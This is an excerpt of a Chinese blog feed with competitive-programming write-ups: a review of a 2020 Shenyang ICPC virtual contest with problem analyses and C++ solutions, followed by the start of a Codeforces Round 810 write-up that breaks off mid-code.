    <category term="题解" scheme="http://example.com/categories/icpc/%E6%9D%AD%E7%94%B5%E6%9D%AF/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>2020沈阳icpc复盘</title>
    <link href="http://example.com/2022/07/25/2020%E6%B2%88%E9%98%B3icpc%E5%A4%8D%E7%9B%98/"/>
    <id>http://example.com/2022/07/25/2020%E6%B2%88%E9%98%B3icpc%E5%A4%8D%E7%9B%98/</id>
    <published>2022-07-25T15:00:00.000Z</published>
    <updated>2022-07-25T15:27:09.772Z</updated>
    
    <content type="html"><![CDATA[<p>和sigma姐姐vp这场icpc。</p><span id="more"></span><h2 id="D-Journey-to-Un’Goro"><a href="#D-Journey-to-Un’Goro" class="headerlink" title="D. Journey to Un’Goro"></a>D. Journey to Un’Goro</h2><p>这题是构造题，本来有思路了的，但是没敢提交。</p><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/07/25/2020%E6%B2%88%E9%98%B3icpc%E5%A4%8D%E7%9B%98/1.png" alt="1"></p><h3 id="题目解析"><a href="#题目解析" class="headerlink" title="题目解析"></a>题目解析</h3><p>就是说给定一个长度，你需要构造一个只有 <code>r</code> 和 <code>b</code> 字符的字符串，在字符串的子串中，如果有奇数个<code>r</code>，这就是个好区间。问你一个这样长度的字符串最多有多少个好区间，并构造出最好的情况，按字典序输出，如果超过100个则输出前100个。</p><p>我们思考一下如何去计算最大值，就得先看看怎么去计数，首先暴力计数需要 $n^2$ 就肯定不行。因为是奇数个，所以我们考虑转化成前缀和。那么我们看看，如果只有一个 <code>r</code> 其它全是 <code>b</code> 我们看哪些区间符合条件。这里我们不妨把 <code>r</code> 当成 1，把 <code>b</code> 当成 0。 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b b b b r r r b b b</span><br><span class="line">0 0 0 0 1 2 3 3 3 3</span><br></pre></td></tr></table></figure><p>可以很容易发现，当前缀和相减之后为奇数时，区间是好区间。那么就是偶数匹配奇数其实，因为偶数减奇数或者奇数减偶数才有可能得到奇数，而前缀和要么是偶数要么是奇数。我们最终得到的结果就是 $num=cnt_{odd}\times cnt_{even}$ 而我们很容易得到 $cnt_{odd}+cnt_{even}=n$ ，根据基本不等式我们不难得到当 $cnt_{odd}$ 与 $cnt_{even}$ 接近的时候 $num$ 得到最大值。</p><p>因为 $n$ 可能是奇数，所以我这里说的是接近。那么奇数就是一个多一个一个少一个，偶数就是都一样就好了。</p><p>那么这个可以直接算出来的。</p><p>$ans=\frac{n}{2}\times \frac{n+1}{2}$  </p><p>那么主要就是怎么构造了，也很简单，既然要字典序，我们就尽量构造 <code>b</code> 实在不行就构造 <code>r</code>。什么叫实在不行呢？那就是前缀和奇数个数超过了 <code>(n+1)/2</code> 这个时候就肯定不行。</p><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">//    clock_t start, end;</span></span><br><span class="line"><span class="comment">//    start = clock();</span></span><br><span class="line"><span class="comment">//    end = clock();</span></span><br><span class="line"><span class="comment">//    cout &lt;&lt; (double) (end - start) / CLOCKS_PER_SEC &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">//ios::sync_with_stdio(false);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rep(i, x, y) for(int i=(x);i&lt;=(y);++i)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> dep(i, x, y) for(int i=(x);i&gt;=(y);--i)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> gcd(a, b) __gcd(a,b)</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">long</span> <span class="keyword">long</span> mod = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1e6</span> + <span class="number">10</span>;</span><br><span class="line"><span class="keyword">int</span> a[maxn]; </span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> cnt=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> flag=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> p[maxn];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> pos,<span class="keyword">int</span> n1,<span class="keyword">int</span> n2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(n1&gt;cnt||n2 &gt; cnt)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(flag==<span class="number">100</span>)<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(pos==n+<span class="number">1</span>)&#123;</span><br><span class="line">        flag++;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)cout&lt;&lt;s[i];</span><br><span class="line">        cout&lt;&lt;endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">        s[pos]=<span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">        p[pos]=p[pos<span class="number">-1</span>];</span><br><span class="line">        p[pos] == <span class="number">1</span> ? res=<span class="built_in">dfs</span>(pos + <span class="number">1</span>, n1 + <span class="number">1</span>, n2) : res=<span class="built_in">dfs</span>(pos + <span class="number">1</span>, n1, n2 + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(res==<span class="number">1</span>)<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        s[pos]=<span class="string">&#x27;r&#x27;</span>;</span><br><span class="line">        p[pos<span class="number">-1</span>]==<span class="number">1</span>?p[pos]=<span class="number">2</span>:p[pos]=<span class="number">1</span>;</span><br><span class="line">        p[pos] == <span class="number">1</span> ? res = <span class="built_in">dfs</span>(pos + <span class="number">1</span>, n1 + <span class="number">1</span>, n2) : res = <span class="built_in">dfs</span>(pos + <span class="number">1</span>, n1, n2 + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(res)<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    p[<span class="number">0</span>]=<span class="number">2</span>;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">int</span> z=<span class="built_in">ceil</span>((<span class="keyword">double</span>)(n+<span class="number">1</span>)/<span class="number">2</span>);</span><br><span class="line">    cout&lt;&lt;z*((n+<span class="number">1</span>)/<span class="number">2</span>)&lt;&lt;endl;</span><br><span class="line">    cnt= z;</span><br><span class="line">    <span class="built_in">dfs</span>(<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="F-Kobolds-and-Catacombs"><a href="#F-Kobolds-and-Catacombs" class="headerlink" title="F. Kobolds and Catacombs"></a>F. Kobolds and Catacombs</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/07/25/2020%E6%B2%88%E9%98%B3icpc%E5%A4%8D%E7%9B%98/2.png" alt="2"></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>就是要把一个序列划分，要尽可能地多划分，被划分的序列在一个内部进行排序，最后要求整个序列不递减。那么我们一开始是很容易想到如果元素 $p_i$ 原本需要在 $j$ 的位置上，那么 $i-j$ 的位置上都应该被划分为一个集合。虽然想到了这点，但是其实还可以用这样一种方式做：前缀和！和排过序的前缀和做比较，当有一个位置前缀和相同则 +1，最后输出答案即可，这个思维一定要想到，是sigma姐姐想出来的，我根本没想到qwq。</p><h3 id="标程-1"><a href="#标程-1" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 1000005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">A</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> value;</span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    <span class="comment">//int new_index;</span></span><br><span class="line">&#125;a[maxn]; </span><br><span class="line"><span class="keyword">int</span> vis[maxn];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(A a,A b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a.value&lt;b.value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> sum1[maxn],sum2[maxn]; </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>,&amp;a[i].value);</span><br><span class="line">        a[i].index=i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        sum1[i]=sum1[i<span class="number">-1</span>]+a[i].value;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">sort</span>(a+<span class="number">1</span>,a+<span class="number">1</span>+n,cmp);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        sum2[i]=sum2[i<span class="number">-1</span>]+a[i].value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(sum1[i]==sum2[i])&#123;</span><br><span class="line">            ans++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,ans);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    <span class="comment">//cin&gt;&gt;t;</span></span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="G-The-Witchwood"><a href="#G-The-Witchwood" class="headerlink" title="G. The Witchwood"></a>G. The Witchwood</h1><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/07/25/2020%E6%B2%88%E9%98%B3icpc%E5%A4%8D%E7%9B%98/3.png" alt="3"></p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>签到，也没啥好说的，就是加出前k大的数。</p><h3 id="标程-2"><a href="#标程-2" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> inf = <span class="number">0x3f3f3f3f</span>;</span><br><span class="line"><span class="keyword">int</span> n, m, t, res = inf;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">1050</span>;</span><br><span class="line"><span class="keyword">int</span> a[N];</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n, k;</span><br><span class="line">    cin &gt;&gt; n &gt;&gt; k;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">        cin &gt;&gt; a[i];</span><br><span class="line">    <span class="built_in">sort</span>(a + <span class="number">1</span>, a + n + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = n; i &gt;= n - k + <span class="number">1</span>; i--)</span><br><span class="line">        sum += a[i];</span><br><span class="line">    cout &lt;&lt; sum;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="K-Scholomance-Academy"><a href="#K-Scholomance-Academy" class="headerlink" title="K.Scholomance Academy"></a>K.Scholomance Academy</h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/07/25/2020%E6%B2%88%E9%98%B3icpc%E5%A4%8D%E7%9B%98/4.png" alt="4"></p><p>题目描述比较长，也不截全了。</p><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>这题是题是题面巨长，但是答案巨简单的一题，讲的是一个机器学习的问题。我们只需要设置 <code>θ</code> 的值扫过去，然后积分算面积即可，没有用到啥算法。</p><h3 id="标程-3"><a href="#标程-3" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> endl <span class="meta-string">&quot;\n&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">1e6</span> + <span class="number">10</span>;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">V</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> op;</span><br><span class="line">    <span class="keyword">int</span> v;</span><br><span class="line">&#125; a[N];</span><br><span class="line"> </span><br><span class="line"><span class="keyword">int</span> n, tn, fn, tp, fp;</span><br><span class="line"><span class="keyword">double</span> ans, preX;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(V&amp; a, V&amp; b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (a.v == b.v)</span><br><span class="line">        <span class="keyword">return</span> a.op &lt; b.op;</span><br><span class="line">    <span class="keyword">return</span> a.v &lt; b.v;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        cin &gt;&gt; a[i].op &gt;&gt; a[i].v;</span><br><span class="line">        <span class="keyword">if</span> (a[i].op == <span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">            fn++;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            tn++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sort</span>(a + <span class="number">1</span>, a + n + <span class="number">1</span>, cmp);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = n; i &gt;= <span class="number">1</span>; i--) &#123;</span><br><span class="line">        <span class="keyword">if</span> (a[i].op == <span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">            tp++, fn--;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            fp++, tn--;</span><br><span class="line">        ans += <span class="number">1.0</span> * tp / (tp + fn) * (<span class="number">1.0</span> * fp / (tn + fp) - preX);</span><br><span class="line">        preX = <span class="number">1.0</span> * fp / (tn + fp);</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="built_in">setprecision</span>(<span class="number">10</span>) &lt;&lt; fixed &lt;&lt; ans &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="题意分析"><a href="#题意分析" class="headerlink" title="题意分析"></a>题意分析</h3><p>题意： 一个时钟，时针走一圈就是一天，现在给定时针走一圈要 $H$ 小时，分针走一圈要 $M$ 分钟，设 $α=\frac{2πA}{HM}$，求一天中时针和分针夹角小于等于 $α$ 的时刻有几次。</p><p>这题首先有如下几个注意点：<br>①分针是按照刻度一格一格走的，因此不能将小数的分钟算入，必须是整的（即不能按照角度来求）。<br>②两者成角度会有两种情况，分针在时针左边成角度 or 在时针右边成角度</p><p><img src="/2022/07/25/2020%E6%B2%88%E9%98%B3icpc%E5%A4%8D%E7%9B%98/5.png" alt="5"></p><p><strong>切入点：</strong> 一般会最先想到用追及问题的角度去做，但是这样就有两个变量（涉及到分针和时针两个对象），所以我们可以选择将<strong>时针作为参照物</strong> （参照物静止不动），运用相对速度只对分针这一个对象做分析。</p><p>两者绝对速度： $v_{h绝对}= \frac{2π}{HM}$ ，$ v_{m绝对}=\frac{2π}{M}$</p><p>分针相对速度： $v_{m相对}=v_{m绝对}-v_{h绝对}=\frac{2π}{HM}*(H-1)=(H-1)v_{h绝对}$</p><p>即分针相对于时针以 $H−1/min$ 的恒定速度运动。</p><p>要使两者之间夹角小于等于α，也就相当于追及问题中的两针“路程差”≤α，而此处因为时针作为参照物了，所以也就转化成了分针的“路程”$≤α=\frac{2πA}{HM}=A*v_{h绝对}$ </p><p>因此我们可以写出一个关于时间 $t∈[0,HM)$ 的不等式：</p><p>$t\times (H-1)v_{h绝对}\ mod\ HM ≤ |α|=|A∗ v h 绝 对 *v_{h绝对}∗v $</p><p>$t\times (H-1)\ mod\ HM\le |A|$</p><p>根据<strong>剩余系定理三：</strong><br>“若a,b,c为任意3个整数，m为正整数，且（m,c)=1，则当ac≡bc(mod m）时，有a≡b(mod m)”</p><p>所以为了满足互质，可将不等式两边同除以 $g =\gcd(H-1,HM)$  ，不等式可等价为：</p><p>$t\times \frac{H-1}{g}\ mod\ \frac{HM}{g} \le |\frac{A}{g}|$</p><p>$\frac{-A}{g}\le t\times \frac{H-1}{g}\ mod\ \frac{HM}{g}\le \frac{A}{g}$</p><p>————注意：此处t的取值范围也同时从 $[ 0 , HM )$ 缩小到 $[ 0,\frac{HM}{g})$ —————</p><p>下面就只需求解出 t 的整数解的个数，即为满足条件的时刻的次数。我画在数轴上会比较直观。只需求出正半轴有几个整数解，然后个数 $\times 2$并且加上零解。</p><p><img src="/2022/07/25/2020%E6%B2%88%E9%98%B3icpc%E5%A4%8D%E7%9B%98/6.png" alt="6"></p><p>正半轴：因为要mod之后余数$≤\frac{A}{g}$，因此一共有余数为$1，2，3…\frac{A}{g} $ 的共计 $\frac{A}{g}$ 个解，并且这些解中没有重复的，即t的值与余数取值一 一对应，下证：</p><p>令$a=\frac{H-1}{g}$ ，$b=\frac{HM}{g} $</p><p>假设存在$t_1$和$t_2$ 两个不同的值满足：$t_1\times\ mod\ b ≡ t_2\times a\ mod\ b$ 且 $t ∈ [ 0 , b ]$  因此根据同余定义，易证$t_1=t_2$ 与假设矛盾，因此每个t的解所对应的余数一定是各不相同的。</p><p>所以在 $t∈[ 0 , \frac{HM}{g} )$ 的范围内一共有 $2\times (\frac{A}{g})+1$个不同整数解。把范围还原到 $ [ 0 , HM ) $，就共有 $g\times[2\times(\frac{A}g)+1]$ 个不同的整数解，也就是本题答案之一。</p><p>有一种情况需要特判，就是当 $A=\frac{HM}{2}$，这时 $α=π$ ，$t ∈ [ 0 , HM )$ 中的每个整数都满足条件，故答案为 $HM$</p><h3 id="标程-4"><a href="#标程-4" class="headerlink" title="标程"></a>标程</h3><p>然后标程就巨短</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ll long long</span></span><br><span class="line">ll h,m,a;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%lld%lld%lld&quot;</span>,&amp;h,&amp;m,&amp;a);</span><br><span class="line">    ll g=__gcd(h<span class="number">-1</span>,h*m);</span><br><span class="line">    <span class="keyword">if</span>(a==h*m/<span class="number">2</span>)  <span class="built_in">printf</span>(<span class="string">&quot;%lld&quot;</span>,h*m);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;%lld&quot;</span>,g*(<span class="number">2</span>*(a/g)+<span class="number">1</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//559C6B224E004E2A4EBA662F8FD979CD611F89C95417FF1F</span></span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>希望能和sigma姐姐一起进步，争取下次能vp到铜首水平。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;和sigma姐姐vp这场icpc。&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="vp" scheme="http://example.com/categories/icpc/vp/"/>
    
    <category term="2020沈阳" scheme="http://example.com/categories/icpc/vp/2020%E6%B2%88%E9%98%B3/"/>
    
    
  </entry>
  
  <entry>
    <title>Codeforces Round 810(Div.2)解析</title>
    <link href="http://example.com/2022/07/25/Codeforces%20Round%20810(Div.2)/"/>
    <id>http://example.com/2022/07/25/Codeforces%20Round%20810(Div.2)/</id>
    <published>2022-07-24T17:00:00.000Z</published>
    <updated>2022-07-24T18:19:54.930Z</updated>
    
    <content type="html"><![CDATA[<p>这场打回来一点吧，只是看隔壁div1好像被喷烂了的样子，咱也不懂，也没资格打div1，很多细节没注意到送出去罚时就很难受，本场录屏在B站了，</p><span id="more"></span><h2 id="A-Perfect-Permutation"><a href="#A-Perfect-Permutation" class="headerlink" title="A. Perfect Permutation"></a>A. Perfect Permutation</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/07/25/Codeforces%20Round%20810(Div.2)/1.png" alt="1"></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>这题题意看了我有点久，就是构造一串能使得 <code>a[i]/i</code> 为整数比较少的序列，那么 <code>i=1</code> 它可以被任意数整除。但是 <code>i&gt;1</code> 我总能找到不能整除的数，因此这里构造的序列就是，第一个给 <code>n</code>，后面的给 <code>i-1</code> 即可。</p><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"><span class="keyword">int</span> dp[maxn],sum1[maxn],sum2[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span 